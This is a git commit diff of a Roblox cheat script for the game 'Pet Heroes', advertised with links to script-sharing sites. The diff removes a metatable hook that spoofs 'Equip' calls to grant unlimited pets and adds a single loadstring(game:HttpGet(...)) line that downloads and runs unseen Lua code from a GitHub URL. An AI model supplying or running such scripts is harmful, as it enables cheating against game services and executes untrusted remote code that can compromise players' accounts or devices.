e599a82ce95a835ab3511fa445dc5059349991d4
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-26 07:13:50 +0100

    commit zero

--- LINK GAME Script pastebin roblox Pet Heroes .lua
+++ LINK GAME Script pastebin roblox Pet Heroes .lua
@@ -1,11 +1,11 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-getgenv().count = -1;  local mt = getrawmetatable(game); setreadonly(mt,false); local nam = mt.__namecall;  mt.__namecall = newcclosure(function(self,...)     local args = {...}     if args[2] == 'Equip' then         args[3] = getgenv().count;         getgenv().count = getgenv().count - 1     end;     return nam(self,unpack(args)); end);
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WalterCums/hub/main/Detection.lua", true))()
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							The script gives you wear endlessly of pitomtsev!
+							A script with many functions for this place!
 						
 ]]
